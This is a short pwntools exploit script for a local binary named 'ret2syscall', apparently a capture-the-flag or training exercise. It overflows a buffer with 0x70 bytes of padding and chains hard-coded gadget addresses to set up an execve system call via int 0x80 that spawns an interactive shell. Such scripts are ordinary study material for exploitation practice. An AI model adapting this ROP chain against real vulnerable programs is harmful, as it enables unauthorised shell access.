from pwn import *
context(arch='i386',os='linux')
p=process('./ret2syscall')

eax_addr=0x080bb196
edx_ecx_ebx_pop_addr=0x0806eb90
int_80_addr=0x08049421
bin_addr=0x080be408

payload=flat(['a'*0x70,eax_addr,0xb,edx_ecx_ebx_pop_addr,0,0,bin_addr,int_80_addr])

p.sendlineafter("do?",payload)
p.interactive()
